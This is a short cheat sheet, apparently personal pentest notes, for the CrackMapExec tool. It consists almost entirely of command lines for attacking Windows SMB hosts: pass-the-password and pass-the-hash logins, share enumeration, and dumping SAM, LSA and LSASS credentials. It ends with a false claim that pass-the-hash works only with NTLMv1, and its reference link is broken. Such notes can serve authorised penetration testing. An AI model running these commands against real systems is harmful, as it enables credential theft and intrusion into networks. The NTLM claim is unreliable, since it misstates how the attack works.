# 1. installation

# 2. usage
- passing the password:
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>

- passing the hash:
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth

- dump SAM hash
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam

- enumerate shares
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --shares

- dump lsa
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --lsa

- show modules
crackmapexec smb -L

- dump lsass
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy

- open database
cmedb

# 3. ETC
- pass the hash works only with ntlm V1, not ntlm V2


---
references:
(1) tcm-sec: [Pass Attacks Overview](broken-link 170)
